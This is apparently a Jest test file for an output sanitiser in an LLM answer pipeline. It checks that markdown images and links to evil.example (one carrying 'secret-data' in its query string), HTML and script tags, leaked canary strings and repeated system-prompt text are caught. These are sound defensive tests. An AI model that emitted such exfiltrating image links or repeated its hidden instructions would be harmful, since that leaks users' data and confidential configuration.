import { containsCanary, leaksInstructions, sanitizeOutput } from './output';

describe('sanitizeOutput', () => {
  it('removes markdown images, which a client would fetch automatically (exfiltration)', () => {
    const result = sanitizeOutput('Here you go ![x](https://evil.example/?q=secret-data) done');
    expect(result.text).toBe('Here you go  done');
    expect(result.removed).toBe(1);
  });

  it('removes HTML tags', () => {
    const result = sanitizeOutput(
      'Hi <img src="https://evil.example/p.png"> <script>alert(1)</script>there</b>',
    );
    expect(result.text).not.toMatch(/<|>/);
    expect(result.removed).toBe(4);
  });

  it('keeps the text of a link but drops its destination', () => {
    const result = sanitizeOutput('See [the policy](https://evil.example/phish) for details.');
    expect(result.text).toBe('See the policy for details.');
    expect(result.removed).toBe(1);
  });

  it('leaves an ordinary answer untouched', () => {
    const text = 'Refunds take five working days [1]. Contact support if 2 < 3 fails.';
    expect(sanitizeOutput(text)).toEqual({ text, removed: 0 });
  });

  it('removes several constructs and counts each', () => {
    const result = sanitizeOutput('![a](http://x/1) and ![b](http://x/2) and [c](http://x/3)');
    expect(result.removed).toBe(3);
    expect(result.text).not.toContain('http');
  });
});

describe('containsCanary', () => {
  const canary = 'cnry-9f3a7c21d4b8e605';

  it('detects the canary in an answer', () => {
    expect(containsCanary(`My hidden marker is ${canary}.`, canary)).toBe(true);
  });

  it('still detects it after the model reformats it', () => {
    expect(containsCanary('marker: CNRY 9f3a 7c21 d4b8 e605', canary)).toBe(true);
    expect(containsCanary('cnry_9F3A7C21D4B8E605', canary)).toBe(true);
  });

  it('does not fire on ordinary answers or on a different canary', () => {
    expect(containsCanary('Refunds take five working days.', canary)).toBe(false);
    expect(containsCanary('cnry-0000000000000000', canary)).toBe(false);
  });

  it('refuses to match on a trivially short canary', () => {
    expect(containsCanary('abc', 'abc')).toBe(false);
  });
});

describe('leaksInstructions', () => {
  const instructions =
    'You are a careful assistant for an organisation. Answer the question using only the numbered sources below. Never invent a source number.';

  it('detects an answer that repeats a run of the hidden instructions', () => {
    const leaked =
      'Sure! My instructions say: answer the question using only the numbered sources below.';
    expect(leaksInstructions(leaked, instructions)).toBe(true);
  });

  it('does not fire on an answer that quotes a source or the question', () => {
    expect(
      leaksInstructions(
        'Refunds take five working days to reach the original card. [1]',
        instructions,
      ),
    ).toBe(false);
  });

  it('needs a long enough run, so a few shared words are fine', () => {
    expect(leaksInstructions('Answer the question briefly.', instructions)).toBe(false);
  });

  it('ignores case and punctuation', () => {
    expect(
      leaksInstructions(
        'ANSWER, THE QUESTION: using only the numbered sources BELOW!',
        instructions,
      ),
    ).toBe(true);
  });

  it('cannot fire when the instruction text is shorter than the window', () => {
    expect(leaksInstructions('anything at all here', 'too short')).toBe(false);
  });
});
